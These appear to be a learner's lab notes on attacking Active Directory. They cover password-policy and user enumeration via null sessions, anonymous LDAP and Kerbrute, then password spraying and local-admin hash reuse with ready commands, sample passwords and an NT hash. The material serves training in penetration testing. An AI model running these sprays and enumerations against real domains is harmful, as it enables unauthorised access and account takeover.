# Enumerating Password Policies
- Can get domain password policy in differnet ways

## With Credentials
- With valid domain credentials, can also get pw policy with CrackMapExec or rpcclient
	- `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`

## Without Credentials
- ie. Have access to a domain-joine machine, but not AD authenticated
- May obtain via LDAP anonymous bind or SMB NULL session
- SMB NULL session
	- possibly result of legacy DC..
	- allows unauthenticated attacker to get info about domain like listin of users, groups etc.
	- Can enumerate with tools like enum4linux, CrackMapExec, rpcclient
		- `rpcclient -U "" -N <IP>`
			- To check DC for SMB NULL session access
		- `querydominfo`
			- To get information on domain
		- `getdompwinfo`
			- To get password policy
	- Enum4linux
		- `enum4linux -p <IP>`
		- `enum4linux-ng -P <IP> -oA output`
			- For nicer formatting and output as YAML/json
	- Enumeration from Windows
		- `net use \\DC01\ipc$ "" /u:""`
		- First "" is password, then "" is for the username. Can try if have
- LDAP anonymous bind
	- Recall that LDAP is the protocol used by AD for query and responses
	- LDAP anonymous bind = connecting to an LDAP server anonymously
		- In AD, LDAP server is the DC
	- LDAP enumeration tools like windapsearch.py, ldapsearch, ldapdomaindump.py
		- ldapsearch
			- `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength`
	- From Windows
		- Assuming we are on an authenticated Windows host on the domain
		- built-in Windows binary `net.exe`
			- `net accounts`
		- PowerView
			- `import-module .\PowerView.ps1`
			- `Get-DomainPolicy`
		- Or tools like CrackMapExec ported to Windows, SharpMapExec..
# Making Target User List
- Assuming on internal machine
- With valid creds can just query AD for the user info
	- With SYSTEM account can also, since it impersonates computer.
	- Computer is treated as domain user account.
- With out valid creds, look for SMB NULL session or LDAP anon bind on DCs
	- To get list of all users within AD
	- Similar for getting password policy
- SMB NULL session
	- enum4linux
		- `enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`
	- rpcclient
		- `rpccclient -U "" -N <IP>`
		- `enumdomusers`
	- crackmapexec
		- `crackmapexec smb 172.16.5.5 --users`
- LDAP Anonymous
	- ldapsearch
		- `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "`
			- -x: use simply bind, no Kerberos etc.
			- no -D or -W: anonymous bind
			- -b: where in directory to starch searching
				- INLANEFREIGHT.LOCAL searched
			- -s sub: search base DN and all child objects
			- "(&(objectclass=user))": search filter
	- `./windapsearch.py --dc-ip <IP> -u "" -U`
- Kerbrute Enumeration
	- Uses Kerberos Pre-Authentication
	- Sends TGT requests to DC without Keberos Pre-Authentication. If KDC responds with "PRINCIPAL UNKNOWN", username is invalid. If it asks for Pre-AUth, username exists
	- `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt `
		- Like before, get jsmith from https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt
	- to put this into a userlist
		- `echo $(kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt ) | grep "VALID USERNAME" | awk '{for (i=1;i<=NF;i++) if ($i ~ /@/) print $i}' | awk -F'@' '{print $1}' >users.txt`

# Build User List with the credentials
- `sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users`

# Internal Password Spraying from Linux
Authenticating to AD -> through SMB, either via NTLM or Kerberos
- Use rpcclient (trying to authenticate to AD via NTLM through SMB)
	- Assuming userlist is called valid_users.txt, password to spray is Welcome1
	- `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`
		- Response Authority Name indicates successful login
- Can also use Kerbrute
	- `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1`
	- This is authenticating through Kerberos
	- Assumes Kerberos pre-auth is enabled (must prove knowledge of password before getting TGT)
		- If pre-auth disabled, is **AS-REP roasting** (different). (which is also diff form Kerberoasting)
	- Kerbrute sends AS-REQ to KDC, and tries to prove knowledge of the password. If KDC gives TGT, authenticated.
- Can also use CrackMapExec
	- `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 --continue-on-success| grep +`
	- Validating via CrackMapExec
		- `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`

## Local Admin Password Reuse
- Spraying not only possile with domain user accounts
- If obtain admin access and the NTLM pw hash/cleartext pw for the local admin account
	- Can try reuse password across multiple hosts in network
	- Target high value hosts like **SQL/Microsoft Exchange** servers
- CrackMapExec
	- `sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +`
		- Spray the entire subnet for using the admin account NT hash retrieved from another machine
		- `--local-auth` to ensure that we dont lock out built-in administrator for hte odmain
- Considerations
	- Reuse
		- eg. if we find desktop host credentials `$desktop%@admin123`, should try `$server%@admin123` against servers
		- if we get password for `ajones`, should try same password on their admin account, eg `ajones_adm`


# Internal Spraying from Windows
- From foothold on domain-joined Windows host
- DomainPasswordSpray
	- If **authenticated to domain**, tool will automatically generate userlist from AD, query the domain password policy, exclude user accounts within one attempt of locking out
	- If **not authenticated to domain**, can supply user list to tool (like in Linux host example)
		- with `-UserList` flag
	- `Import-Module .\DomainPasswordSpray.ps1`
	- `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`
		- No `-UserList` since we are domain authenticated, so let tool generate it for us
- Can also use Kerbrute

